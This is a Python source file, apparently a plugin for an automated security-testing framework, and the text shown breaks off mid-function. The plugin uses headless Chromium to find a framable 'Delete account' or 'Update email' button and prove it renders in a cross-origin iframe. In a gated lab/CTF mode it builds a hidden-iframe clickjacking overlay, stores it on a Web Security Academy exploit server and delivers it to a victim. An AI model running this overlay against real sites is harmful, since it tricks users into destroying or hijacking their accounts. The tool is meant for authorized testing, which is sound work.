"""Closed root-only browser proof for single-click clickjacking (#1290).

The model supplies only the authorized workflow root.  This tool discovers and
measures a sensitive action in Chromium, proves that the page renders in a
cross-origin frame, and owns the complete overlay HTML.  Runtime mode is
read-only.  A separately gated lab/CTF suffix may store the fixed PoC on an
exploit server observed in the target root and deliver it once.
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import json
import re
import secrets
from html.parser import HTMLParser
from typing import Any, Dict, Iterable, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin


MODE = "single-click-sensitive-action-v1"
RUNTIME_PROOF = "runtime-read-only"
LAB_PROOF = "lab-state-change"
VIEWPORT_WIDTH = 1920
VIEWPORT_HEIGHT = 1080
MAX_RESPONSE_BYTES = 96_000
MAX_REQUESTS = 24
MAX_TARGET_CHARS = 4_096
MAX_COOKIE_CHARS = 8_192
MAX_HEADER_VALUE_CHARS = 8_192
RUNTIME_LABELS = (
    "clickjacking-root-baseline",
    "clickjacking-sensitive-page",
    "clickjacking-frame-render-proof",
)
LAB_LABELS = (
    "clickjacking-lab-unsolved-control",
    "clickjacking-exploit-server-discovery",
    "clickjacking-exploit-store",
    "clickjacking-exploit-content-control",
    "clickjacking-exploit-frame-proof",
    "clickjacking-victim-delivery",
    "clickjacking-victim-dispatch",
    "clickjacking-lab-solved-confirmation",
)
SENSITIVE_LABELS = ("Delete account", "Update email")
PREFILLED_EMAIL = "xasm-clickjacking@example.invalid"
SENSITIVE_HEADERS = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-api-key",
    "x-csrf-token",
    "x-xsrf-token",
}


def _sha(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()


def _origin(value: str) -> str:
    parsed = urlsplit(value)
    scheme = parsed.scheme.lower()
    host = (parsed.hostname or "").lower()
    port = parsed.port or (443 if scheme == "https" else 80)
    default = 443 if scheme == "https" else 80
    formatted = f"[{host}]" if ":" in host else host
    return f"{scheme}://{formatted}{'' if port == default else f':{port}'}"


def _same_origin(left: str, right: str) -> bool:
    try:
        return _origin(left) == _origin(right)
    except ValueError:
        return False


def _validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > MAX_TARGET_CHARS or any(ch in raw for ch in "\r\n\0"):
        return None
    try:
        parsed = urlsplit(raw)
        _ = parsed.port
    except ValueError:
        return None
    if (
        parsed.scheme.lower() not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
    ):
        return None
    return f"{_origin(raw)}{parsed.path or '/'}"


def _safe_url(base: str, candidate: Any, *, same_origin: bool = True) -> Optional[str]:
    raw = str(candidate or "").strip()
    if not raw or len(raw) > 2_048 or any(ch in raw for ch in "\r\n\0\\"):
        return None
    if raw.lower().startswith(("javascript:", "data:", "mailto:", "tel:")):
        return None
    try:
        absolute = urljoin(base, raw)
        parsed = urlsplit(absolute)
        _ = parsed.port
    except ValueError:
        return None
    if (
        parsed.scheme.lower() not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.fragment
        or (same_origin and not _same_origin(base, absolute))
    ):
        return None
    return absolute


def _is_unsolved(body: str) -> bool:
    lower = str(body or "").lower()
    return "is-notsolved" in lower and "is-solved" not in lower


def _is_solved(body: str) -> bool:
    lower = str(body or "").lower()
    return "is-solved" in lower and "is-notsolved" not in lower


def _framing_protected(headers: Dict[str, str]) -> bool:
    lowered = {str(name).lower(): str(value) for name, value in headers.items()}
    xfo = lowered.get("x-frame-options", "").strip()
    csp = lowered.get("content-security-policy", "")
    return bool(xfo or re.search(r"(?:^|;)\s*frame-ancestors\s+", csp, re.I))


def _rect_valid(rect: Any) -> bool:
    if not isinstance(rect, dict):
        return False
    try:
        values = [float(rect[key]) for key in ("x", "y", "width", "height")]
    except (KeyError, TypeError, ValueError):
        return False
    x, y, width, height = values
    return (
        0 <= x < VIEWPORT_WIDTH
        and 0 <= y < VIEWPORT_HEIGHT
        and 8 <= width <= VIEWPORT_WIDTH
        and 8 <= height <= VIEWPORT_HEIGHT
        and x + width <= VIEWPORT_WIDTH
        and y + height <= VIEWPORT_HEIGHT
    )


def _center(rect: Dict[str, Any]) -> Dict[str, float]:
    return {
        "x": round(float(rect["x"]) + float(rect["width"]) / 2, 2),
        "y": round(float(rect["y"]) + float(rect["height"]) / 2, 2),
    }


def _center_inside(center: Dict[str, float], rect: Dict[str, Any], tolerance: float = 2.0) -> bool:
    return (
        float(rect["x"]) - tolerance <= center["x"] <= float(rect["x"]) + float(rect["width"]) + tolerance
        and float(rect["y"]) - tolerance <= center["y"] <= float(rect["y"]) + float(rect["height"]) + tolerance
    )


def _browser_auth_cookies(raw_cookie: str, target_origin: str) -> List[Dict[str, Any]]:
    """Translate the server-owned cookie header into Chromium cookie rows.

    The session inventory deliberately exposes only ``name=value`` pairs to
    tools.  Playwright otherwise assigns those injected HTTPS cookies its
    default ``Lax`` disposition, which is not a neutral reconstruction: it
    suppresses the authenticated cookie in the cross-site iframe before the
    probe can measure it.  Use the permissive browser disposition solely for
    this visual iframe control.  A lab finding still requires the independent
    exploit-server victim to complete the state transition with the target's
    real cookie attributes.
    """
    secure_target = urlsplit(target_origin).scheme.lower() == "https"
    rows: List[Dict[str, Any]] = []
    for part in raw_cookie.split(";"):
        name, separator, value = part.strip().partition("=")
        if not separator or not name:
            continue
        row: Dict[str, Any] = {"name": name, "value": value, "url": target_origin}
        if secure_target:
            row.update({"secure": True, "sameSite": "None"})
        rows.append(row)
    return rows


def _stable_account_entrypoint(
    requested: str,
    resolved: str,
    action_label: str = "Delete account",
) -> Optional[str]:
    """Keep a victim-neutral account URL when the probe session redirects."""
    if not _same_origin(requested, resolved):
        return None
    parsed = urlsplit(requested)
    path = (parsed.path or "/").rstrip("/") or "/"
    if path.lower() not in {"/my-account", "/account", "/profile"}:
        return None
    entrypoint = f"{_origin(requested)}{path}"
    if action_label == "Update email":
        return f"{entrypoint}?{urlencode({'email': PREFILLED_EMAIL})}"
    return entrypoint


def _sensitive_action_pattern(action_label: str) -> re.Pattern[str]:
    if action_label not in SENSITIVE_LABELS:
        raise ValueError("unsupported clickjacking sensitive action")
    return re.compile(rf"^{re.escape(action_label)}$", re.I)


def build_overlay_html(target_url: str, rect: Dict[str, Any], nonce: str) -> str:
    """Return the one allowed static PoC shape; no caller-controlled script exists."""
    center = _center(rect)
    decoy_width = max(80.0, min(float(rect["width"]), 240.0))
    decoy_height = max(32.0, min(float(rect["height"]), 80.0))
    left = center["x"] - decoy_width / 2
    top = center["y"] - decoy_height / 2
    escaped_target = html.escape(target_url, quote=True)
    escaped_nonce = html.escape(nonce, quote=True)
    return (
        "<!doctype html><html><head><meta charset=\"utf-8\"><title>Clickjacking proof</title>"
        "<style>html,body{margin:0;width:100%;height:100%;overflow:hidden}"
        f"#xasm-decoy{{position:absolute;left:{left:.2f}px;top:{top:.2f}px;width:{decoy_width:.2f}px;"
        f"height:{decoy_height:.2f}px;z-index:1}}"
        f"#xasm-frame{{position:absolute;left:0;top:0;width:{VIEWPORT_WIDTH}px;height:{VIEWPORT_HEIGHT}px;"
        "border:0;opacity:.0001;z-index:2}</style></head>"
        f"<body data-xasm-clickjacking-nonce=\"{escaped_nonce}\">"
        "<div id=\"xasm-decoy\">Click me</div>"
        f"<iframe id=\"xasm-frame\" sandbox=\"allow-forms\" src=\"{escaped_target}\"></iframe></body></html>"
    )


class _LinkParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.hrefs: List[str] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        if tag.lower() != "a":
            return
        values = {str(name).lower(): str(value or "") for name, value in attrs}
        if values.get("href"):
            self.hrefs.append(values["href"].strip())


class _ExploitFormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.forms: List[Dict[str, Any]] = []
        self._form: Optional[Dict[str, Any]] = None

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        values = {str(name).lower(): str(value or "") for name, value in attrs}
        lower = tag.lower()
        if lower == "form":
            self._form = {"action": values.get("action", ""), "method": values.get("method", "get"), "fields": []}
        elif self._form is not None and lower in {"input", "textarea", "button"}:
            if values.get("name"):
                self._form["fields"].append(
                    {
                        "tag": lower,
                        "name": values["name"],
                        "type": values.get("type", ""),
                        "value": values.get("value", ""),
                    }
                )

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def _parse_exploit_form(body: str, exploit_url: str) -> Optional[Dict[str, str]]:
    parser = _ExploitFormParser()
    try:
        parser.feed(body)
        parser.close()
    except Exception:
        return None
    for form in parser.forms:
        if str(form.get("method", "")).lower() != "post":
            continue
        action_url = _safe_url(exploit_url, form.get("action") or urlsplit(exploit_url).path)
        if not action_url:
            continue
        fields = form.get("fields") or []
        body_fields = [
            field["name"]
            for field in fields
            if field["tag"] == "textarea" and "body" in field["name"].lower()
        ]
        file_fields = [field["name"] for field in fields if "file" in field["name"].lower()]
        head_fields = [field["name"] for field in fields if "head" in field["name"].lower()]
        https_fields = [field["name"] for field in fields if "https" in field["name"].lower()]
        actions = [field for field in fields if field["type"].lower() == "submit" and field["value"]]
        store = next((field for field in actions if "STORE" in field["value"].upper()), None)
        deliver = next((field for field in actions if "DELIVER" in field["value"].upper()), None)
        if len(body_fields) != 1 or len(file_fields) != 1 or len(head_fields) != 1 or not store or not deliver:
            continue
        return {
            "actionUrl": action_url,
            "bodyField": body_fields[0],
            "fileField": file_fields[0],
            "headField": head_fields[0],
            "httpsField": https_fields[0] if len(https_fields) == 1 else "",
            "actionField": store["name"],
            "storeValue": store["value"],
            "deliverValue": deliver["value"],
            "storedUrl": urljoin(_origin(exploit_url) + "/", "exploit"),
        }
    return None


class WebClickjackingProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:clickjacking_probe"

    @property
    def description(self) -> str:
        return "Discovers, measures, frames, and lab-delivers one tool-owned single-click UI-redress proof from a root URL."

    @property
    def schema(self) -> Dict[str, Any]:
        owned = {"x-workflow-owned": True}
        hidden = {"x-hidden": True, "x-workflow-owned": True}
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {"type": "string", "enum": [MODE], "default": MODE, **owned},
                "proofLevel": {"type": "string", "enum": [RUNTIME_PROOF, LAB_PROOF], "default": RUNTIME_PROOF, **owned},
                "engagement": {"type": "string", "enum": ["standard", "aggressive", "lab", "ctf"], "default": "standard", **owned},
                "discoverFromTarget": {"type": "boolean", "default": True, **owned},
                "pageBudget": {"type": "integer", "minimum": 1, "maximum": 4, "default": 3, **owned},
                "requestBudget": {"type": "integer", "minimum": 3, "maximum": MAX_REQUESTS, "default": 12, **owned},
                "browserTimeoutSeconds": {"type": "integer", "minimum": 5, "maximum": 45, "default": 20, **owned},
                "stopAfterFirstFinding": {"type": "boolean", "default": True, **owned},
                "authCookies": {"type": "string", **hidden},
                "authHeaders": {"type": "object", "additionalProperties": {"type": "string"}, **hidden},
                "allowUnsafeMethods": {"type": "boolean", "default": False, **owned},
                "stateChangeApproved": {"type": "boolean", "default": False, **owned},
                "labVictimDeliveryApproved": {"type": "boolean", "default": False, **owned},
                "allowDiscoveredExploitServer": {"type": "boolean", "default": False, **owned},
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 3,
            "domain": ["web"],
            "input_type": ["url", "authenticated-session"],
            "output_type": ["findings"],
            "chainable_after": ["browser:map_app", "web:security_controls_probe"],
            "chainable_before": ["decision:"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Prove a single-click sensitive action is exploitable through UI redress",
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        target = _validate_target(parameters.get("target"))
        if not target:
            return self._error("target must be a credential-free HTTP(S) URL without query or fragment")
        proof_level = str(parameters.get("proofLevel") or RUNTIME_PROOF)
        engagement = str(parameters.get("engagement") or "standard").lower()
        if str(parameters.get("mode") or MODE) != MODE:
            return self._error(f"mode must be {MODE}", target)
        if proof_level not in {RUNTIME_PROOF, LAB_PROOF} or engagement not in {"standard", "aggressive", "lab", "ctf"}:
            return self._error("unsupported proofLevel or engagement", target)
        if parameters.get("discoverFromTarget", True) is not True or parameters.get("stopAfterFirstFinding", True) is not True:
            return self._error("discovery and stopAfterFirstFinding must remain enabled", target)
        if proof_level == LAB_PROOF and not all(
            (
                engagement in {"lab", "ctf"},
                parameters.get("allowUnsafeMethods") is True,
                parameters.get("stateChangeApproved") is True,
                parameters.get("labVictimDeliveryApproved") is True,
                parameters.get("allowDiscoveredExploitServer") is True,
            )
        ):
            return self._error("lab-state-change requires lab/ctf and every server-owned approval gate", target)

        cookie, auth_headers, auth_error = self._auth_context(parameters)
        if auth_error:
            return self._error(auth_error, target)
        self._secrets: Set[str] = {value for value in [cookie, *auth_headers.values()] if value}
        self._target = target
        entries = ({"cookie": cookie} if cookie else {}) | {name.lower(): value for name, value in auth_headers.items()}
        self._auth_context_sha = _sha("\n".join(f"{name}:{value}" for name, value in sorted(entries.items()))) if entries else None
        self._request_budget = max(3, min(int(parameters.get("requestBudget") or (12 if proof_level == LAB_PROOF else 4)), MAX_REQUESTS))
        self._timeout = max(5, min(int(parameters.get("browserTimeoutSeconds") or 20), 45))

        try:
            browser_result = await self._browser_discover_and_frame(target, cookie, auth_headers)
            if not browser_result["frameRendered"]:
                return self._no_finding(target, proof_level, browser_result["reason"], browser_result)
            runtime_steps = browser_result["steps"]
            if proof_level == RUNTIME_PROOF:
                return self._no_finding(
                    target,
                    proof_level,
                    "frameable sensitive action observed; runtime mode intentionally performs no victim delivery",
                    browser_result,
                )

            root_body = browser_result["rootBody"]
            if not _is_unsolved(root_body):
                return self._no_finding(target, proof_level, "lab root did not prove an unsolved baseline", browser_result)
            exploit_url = self._observed_exploit_url(root_body, target)
            if not exploit_url:
                return self._no_finding(target, proof_level, "no valid exploit server was observed in the target root", browser_result)
            lab = await self._lab_delivery(
                target,
                exploit_url,
                browser_result["actionUrl"],
                browser_result["directRect"],
                browser_result["accountObservation"],
                root_body,
            )
            steps = [*runtime_steps, *lab["steps"]]
            if len(steps) > self._request_budget:
                raise ValueError("clickjacking proof exceeded its workflow request budget")
            verification = {
                "verified": True,
                "fallback": False,
                "mode": MODE,
                "proofLevel": proof_level,
                "targetOrigin": _origin(target),
                "actionUrl": browser_result["actionUrl"],
                "actionLabel": browser_result["actionLabel"],
                "actionMethod": browser_result["actionMethod"],
                "framingHeadersAbsent": True,
                "frameRendered": True,
                "viewport": {"width": VIEWPORT_WIDTH, "height": VIEWPORT_HEIGHT},
                "iframeViewport": {"width": VIEWPORT_WIDTH, "height": VIEWPORT_HEIGHT},
                "iframeSandbox": "allow-forms",
                "directActionRect": browser_result["directRect"],
                "framedActionRect": browser_result["framedRect"],
                "decoyCenter": _center(browser_result["directRect"]),
                "decoyCenterInsideAction": True,
                "authContextSha256": self._auth_context_sha,
                "exploitServerOrigin": _origin(exploit_url),
                "exploitNonceSha256": lab["nonceSha256"],
                "exploitContentSha256": lab["contentSha256"],
                "labSolvedTransition": True,
                "stateChangingRequestCount": 2,
                "stateChangingMethods": ["POST", "POST"],
                "requestCount": len(steps),
                "scopeEnforcedInBrowser": True,
                "redirectsFollowedAcrossOrigin": False,
                "clickjackingEvidence": {"version": 1, "steps": steps},
            }
            finding = self._finding(browser_result["actionUrl"], verification)
            return {
                "success": True,
                "tool": self.name,
                "target": target,
                "mode": MODE,
                "proofLevel": proof_level,
                "verified": True,
                "fallback": False,
                "requestCount": len(steps),
                "findings": [finding],
                "total_findings": 1,
                "verification": verification,
                "summary": {"verified": True, "frameRendered": True, "solved": True, "requests": len(steps), "fallback": False},
            }
        except Exception as exc:
            return self._error(self._sanitize(str(exc))[:500], target)

    def _auth_context(self, parameters: Dict[str, Any]) -> Tuple[str, Dict[str, str], Optional[str]]:
        raw_cookie = parameters.get("authCookies")
        cookie = str(raw_cookie or "").strip()
        if cookie and (len(cookie) > MAX_COOKIE_CHARS or any(ch in cookie for ch in "\r\n\0") or "=" not in cookie):
            return "", {}, "server-injected authCookies is malformed"
        raw_headers = parameters.get("authHeaders")
        if raw_headers is not None and not isinstance(raw_headers, dict):
            return "", {}, "authHeaders must be a workflow-owned object"
        headers: Dict[str, str] = {}
        for raw_name, raw_value in (raw_headers or {}).items():
            name = str(raw_name).strip().lower()
            value = str(raw_value).strip()
            if name not in {"authorization", "x-api-key"} or not value or len(value) > MAX_HEADER_VALUE_CHARS or any(ch in str(raw_name) + value for ch in "\r\n\0"):
                return "", {}, "authHeaders contains unsupported or malformed authentication material"
            canonical = "Authorization" if name == "authorization" else "X-API-Key"
            if canonical in headers:
                return "", {}, "authHeaders contains a duplicate authentication header"
            headers[canonical] = value
        return cookie, headers, None

    async def _browser_discover_and_frame(self, target: str, cookie: str, auth_headers: Dict[str, str]) -> Dict[str, Any]:
        try:
            from playwright.async_api import async_playwright
        except Exception as exc:
            raise ValueError(f"Playwright is unavailable for clickjacking proof: {exc}") from exc

        timeout_ms = self._timeout * 1_000
        target_origin = _origin(target)
        async with async_playwright() as playwright:
            browser = await playwright.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
            try:
                context = await browser.new_context(
                    viewport={"width": VIEWPORT_WIDTH, "height": VIEWPORT_HEIGHT},
                    ignore_https_errors=False,
                )
                if cookie:
                    cookies = _browser_auth_cookies(cookie, target_origin)
                    if cookies:
                        await context.add_cookies(cookies)

                async def guard_route(route: Any, request: Any) -> None:
                    if request.url.startswith(("about:", "data:")):
                        await route.continue_()
                        return
                    if not _same_origin(target, request.url):
                        await route.abort("blockedbyclient")
                        return
                    headers = dict(request.headers)
                    headers.update(auth_headers)
                    await route.continue_(headers=headers)

                await context.route("**/*", guard_route)
                page = await context.new_page()
                root_response = await page.goto(target, wait_until="domcontentloaded", timeout=timeout_ms)
                if root_response is None or not _same_origin(target, root_response.url):
                    raise ValueError("target root did not remain on the authorized origin")
                root_body = await page.content()
                root_headers = await root_response.all_headers()
                root_observation = self._observation("GET", target, root_response.status, root_headers, self._root_evidence(root_body))

                hrefs = await page.locator("a[href]").evaluate_all("els => els.map(el => el.getAttribute('href'))")
                candidates: List[str] = []
                for href in [target, *hrefs, "/my-account"]:
                    candidate = _safe_url(target, href)
                    if candidate and urlsplit(candidate).path.lower().rstrip("/") in {"/my-account", "/account", "/profile"} and candidate not in candidates:
                        candidates.append(candidate)

                action_label = (
                    "Update email"
                    if any(
                        marker in root_body.lower()
                        for marker in (
                            "form input data prefilled from a url parameter",
                            "frame buster script",
                        )
                    )
                    else "Delete account"
                )
                action_page = None
                action_entrypoint = None
                action_response = None
                action_locator = None
                for candidate in candidates[:3]:
                    response = await page.goto(candidate, wait_until="domcontentloaded", timeout=timeout_ms)
                    if response is None or not _same_origin(target, response.url) or not _same_origin(target, page.url):
                        continue
                    locator = page.get_by_role(
                        "button",
                        name=_sensitive_action_pattern(action_label),
                    )
                    if await locator.count() == 1 and await locator.is_visible() and await locator.is_enabled():
                        # Keep the discovered account entrypoint for the victim
                        # frame.  The authenticated browser may canonicalize it
                        # to a user-specific URL such as
                        # ``/my-account?id=wiener``; replaying that final URL for
                        # another victim can suppress or misroute their action.
                        action_entrypoint = _stable_account_entrypoint(
                            candidate,
                            page.url,
                            action_label,
                        )
                        action_page = page.url
                        action_response, action_locator = response, locator
                        break
                if not action_entrypoint or not action_page or action_response is None or action_locator is None:
                    return {"frameRendered": False, "reason": "no authenticated visible single-click sensitive action was discovered", "rootBody": root_body, "steps": [self._evidence(RUNTIME_LABELS[0], root_observation)]}

                # The prefilled variation is causal only when the controlled
                # email is present in the page that was actually measured.
                # Discovery starts from the neutral account route, so load the
                # tool-owned entrypoint and reacquire the response/control
                # before recording evidence or geometry.  The application may
                # append a user-specific ``id`` while preserving the email.
                if action_label == "Update email":
                    response = await page.goto(
                        action_entrypoint,
                        wait_until="domcontentloaded",
                        timeout=timeout_ms,
                    )
                    if (
                        response is None
                        or not _same_origin(target, response.url)
                        or not _same_origin(target, page.url)
                    ):
                        raise ValueError("prefilled sensitive page left the authorized origin")
                    locator = page.get_by_role(
                        "button",
                        name=_sensitive_action_pattern(action_label),
                    )
                    if (
                        await locator.count() != 1
                        or not await locator.is_visible()
                        or not await locator.is_enabled()
                    ):
                        raise ValueError("prefilled sensitive action was not visible and enabled")
                    observed_query = parse_qs(urlsplit(page.url).query, keep_blank_values=True)
                    if observed_query.get("email") != [PREFILLED_EMAIL]:
                        raise ValueError("prefilled sensitive page did not preserve the controlled email")
                    action_page = page.url
                    action_response, action_locator = response, locator

                headers = await action_response.all_headers()
                if _framing_protected(headers):
                    account_observation = self._observation(
                        "GET",
                        action_page,
                        action_response.status,
                        headers,
                        self._account_evidence(True, action_label),
                    )
                    return {"frameRendered": False, "reason": "the sensitive page emitted an effective anti-framing header", "rootBody": root_body, "steps": [self._evidence(RUNTIME_LABELS[0], root_observation), self._evidence(RUNTIME_LABELS[1], account_observation)]}
                direct_rect = await action_locator.bounding_box()
                if not _rect_valid(direct_rect):
                    raise ValueError("sensitive action geometry was absent or outside the fixed viewport")
                form = await action_locator.evaluate(
                    "el => { const f=el.closest('form'); return f ? {action:f.action,method:(f.method||'get').toUpperCase()} : null; }"
                )
                if not isinstance(form, dict) or str(form.get("method")) != "POST":
                    raise ValueError("the discovered sensitive control was not a POST form action")
                form_action = _safe_url(action_page, form.get("action"))
                if not form_action:
                    raise ValueError("the sensitive action form left the authorized origin")
                account_observation = self._observation(
                    "GET",
                    action_page,
                    action_response.status,
                    headers,
                    self._account_evidence(False, action_label),
                )

                frame_page = await context.new_page()
                await frame_page.set_content(
                    f'<!doctype html><iframe id="probe" sandbox="allow-forms" src="{html.escape(action_entrypoint, quote=True)}" style="position:absolute;left:0;top:0;width:{VIEWPORT_WIDTH}px;height:{VIEWPORT_HEIGHT}px;border:0"></iframe>',
                    wait_until="domcontentloaded",
                    timeout=timeout_ms,
                )
                frame = next((item for item in frame_page.frames if item != frame_page.main_frame and _same_origin(action_page, item.url)), None)
                if frame is None:
                    await frame_page.wait_for_timeout(500)
                    frame = next((item for item in frame_page.frames if item != frame_page.main_frame and _same_origin(action_page, item.url)), None)
                if frame is None:
                    return {"frameRendered": False, "reason": "the sensitive page did not render in a cross-origin iframe", "rootBody": root_body, "steps": [self._evidence(RUNTIME_LABELS[0], root_observation), self._evidence(RUNTIME_LABELS[1], account_observation)]}
                framed_locator = frame.get_by_role(
                    "button",
                    name=_sensitive_action_pattern(action_label),
                )
                if await framed_locator.count() != 1 or not await framed_locator.is_visible():
                    return {"frameRendered": False, "reason": "the framed sensitive action was not visible", "rootBody": root_body, "steps": [self._evidence(RUNTIME_LABELS[0], root_observation), self._evidence(RUNTIME_LABELS[1], account_observation)]}
                framed_rect = await framed_locator.bounding_box()
                if not _rect_valid(framed_rect) or not _center_inside(_center(direct_rect), framed_rect):
                    raise ValueError("direct and framed sensitive-action geometry did not preserve click alignment")
                frame_observation = dict(account_observation)
                frame_observation["body"] = self._frame_evidence(direct_rect, framed_rect)
                steps = [
                    self._evidence(RUNTIME_LABELS[0], root_observation),
                    self._evidence(RUNTIME_LABELS[1], account_observation),
                    self._evidence(RUNTIME_LABELS[2], frame_observation),
                ]
                return {
                    "frameRendered": True,
                    "reason": "cross-origin iframe rendered the visible sensitive action",
                    "rootBody": root_body,
                    "actionUrl": action_entrypoint,
                    "actionFormUrl": form_action,
                    "actionMethod": "POST",
                    "actionLabel": action_label,
                    "directRect": direct_rect,
                    "framedRect": framed_rect,
                    "accountObservation": account_observation,
                    "steps": steps,
                }
            finally:
                await browser.close()

    def _observed_exploit_url(self, body: str, target: str) -> Optional[str]:
        parser = _LinkParser()
        try:
            parser.feed(body)
            parser.close()
        except Exception:
            return None
        target_host = (urlsplit(target).hostname or "").lower()
        for href in parser.hrefs:
            candidate = _safe_url(target, href, same_origin=False)
            if not candidate or _same_origin(target, candidate):
                continue
            parsed = urlsplit(candidate)
            host = (parsed.hostname or "").lower()
            public_pair = target_host.endswith(".web-security-academy.net") and parsed.scheme == "https" and host.endswith(".exploit-server.net")
            fixture_pair = target_host.endswith(".lab") and parsed.scheme == "http" and host.endswith(".lab")
            if public_pair or fixture_pair:
                return f"{_origin(candidate)}{parsed.path or '/'}"
        return None

    async def _http(self, session: aiohttp.ClientSession, method: str, url: str, *, form: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        headers = {"User-Agent": "xASM-Clickjacking-Probe/1.0", "Accept": "text/html,application/xhtml+xml"}
        body = None
        if form is not None:
            body = urlencode(form)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        async with session.request(method, url, headers=headers, data=body, allow_redirects=False) as response:
            raw = await response.content.read(MAX_RESPONSE_BYTES + 1)
            if len(raw) > MAX_RESPONSE_BYTES:
                raise ValueError("HTTP response exceeded the clickjacking evidence limit")
            return self._observation(method, url, response.status, dict(response.headers), raw.decode("utf-8", "replace"), body or "")

    async def _lab_delivery(self, target: str, exploit_url: str, action_url: str, rect: Dict[str, Any], account_observation: Dict[str, Any], root_body: str) -> Dict[str, Any]:
        nonce = f"xasm-clickjacking-{secrets.token_hex(12)}"
        content = build_overlay_html(action_url, rect, nonce)
        timeout = aiohttp.ClientTimeout(total=self._timeout)
        async with aiohttp.ClientSession(timeout=timeout, cookie_jar=aiohttp.DummyCookieJar()) as session:
            exploit_root = await self._http(session, "GET", exploit_url)
            if exploit_root["status"] != 200:
                raise ValueError("observed exploit server did not return HTTP 200")
            form = _parse_exploit_form(exploit_root["body"], exploit_url)
            if not form:
                raise ValueError("observed exploit server lacked the closed STORE/DELIVER form")
            fields = {
                form["fileField"]: "/exploit",
                form["headField"]: "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
                form["bodyField"]: content,
                form["actionField"]: form["storeValue"],
            }
            if form["httpsField"]:
                fields[form["httpsField"]] = "on" if urlsplit(exploit_url).scheme == "https" else ""
            stored = await self._http(session, "POST", form["actionUrl"], form=fields)
            if stored["status"] not in {200, 302, 303}:
                raise ValueError("exploit server rejected the single STORE action")
            content_control = await self._http(session, "GET", form["storedUrl"])
            if content_control["status"] != 200 or content_control["body"] != content:
                raise ValueError("stored exploit content did not exactly match the tool-owned overlay")
            frame_control = dict(content_control)
            frame_control["body"] = self._frame_evidence(rect, rect, nonce)
            fields[form["actionField"]] = form["deliverValue"]
            delivered = await self._http(session, "POST", form["actionUrl"], form=fields)
            if delivered["status"] not in {302, 303}:
                raise ValueError("exploit server rejected the single victim delivery redirect")
            location = next(
                (
                    value
                    for name, value in delivered.get("headers", {}).items()
                    if str(name).lower() == "location"
                ),
                "",
            )
            dispatch_url = _safe_url(form["actionUrl"], location)
            if not dispatch_url or not _same_origin(exploit_url, dispatch_url):
                raise ValueError("victim delivery redirect left the observed exploit origin")
            dispatched = await self._http(session, "GET", dispatch_url)
            if dispatched["status"] not in {200, 302, 303}:
                raise ValueError("exploit server rejected the victim dispatch follow-up")
            solved = None
            for _ in range(12):
                await asyncio.sleep(0.75)
                candidate = await self._http(session, "GET", target)
                if _is_solved(candidate["body"]):
                    solved = candidate
                    break
            if solved is None or not _is_unsolved(root_body):
                raise ValueError("lab did not transition from Not solved to Solved after delivery")
            unsolved = self._observation("GET", target, 200, {}, self._root_evidence(root_body))
            solved["body"] = self._root_evidence(solved["body"])
            exploit_root["body"] = "<html><body>Exploit server STORE and DELIVER form observed</body></html>"
            stored["body"] = "stored"
            delivered["body"] = "delivered"
            return {
                "nonceSha256": _sha(nonce),
                "contentSha256": _sha(content),
                "steps": [
                    self._evidence(LAB_LABELS[0], unsolved),
                    self._evidence(LAB_LABELS[1], exploit_root),
                    self._evidence(LAB_LABELS[2], stored),
                    self._evidence(LAB_LABELS[3], content_control),
                    self._evidence(LAB_LABELS[4], frame_control),
                    self._evidence(LAB_LABELS[5], delivered),
                    self._evidence(LAB_LABELS[6], dispatched),
                    self._evidence(LAB_LABELS[7], solved),
                ],
            }

    def _observation(self, method: str, url: str, status: int, headers: Dict[str, Any], body: str, request_body: str = "") -> Dict[str, Any]:
        return {"method": method, "url": url, "status": int(status), "headers": {str(k): str(v) for k, v in headers.items()}, "body": str(body or ""), "requestBody": request_body}

    def _evidence(self, label: str, observation: Dict[str, Any]) -> Dict[str, Any]:
        parsed = urlsplit(observation["url"])
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        body = self._sanitize(observation.get("requestBody", ""))
        request_lines = [f"{observation['method']} {path} HTTP/1.1", f"Host: {parsed.netloc}", "Accept: text/html,application/xhtml+xml"]
        if body:
            request_lines.extend(["Content-Type: application/x-www-form-urlencoded", f"Content-Length: {len(body.encode('utf-8'))}"])
        request = "\r\n".join(request_lines) + "\r\n\r\n" + body
        safe_headers = []
        for name, value in observation.get("headers", {}).items():
            lower = name.lower()
            if lower in SENSITIVE_HEADERS:
                continue
            if lower in {"content-type", "x-frame-options", "content-security-policy", "location"}:
                safe_headers.append((name, self._sanitize(value)))
        response_body = self._sanitize(observation.get("body", ""))
        response_lines = [f"HTTP/1.1 {observation['status']} Xasm"]
        response_lines.extend(f"{name}: {value}" for name, value in safe_headers)
        response_lines.append(f"Content-Length: {len(response_body.encode('utf-8'))}")
        response = "\r\n".join(response_lines) + "\r\n\r\n" + response_body
        return {
            "label": label,
            "url": observation["url"],
            "request": request,
            "requestSha256": _sha(request),
            "response": response,
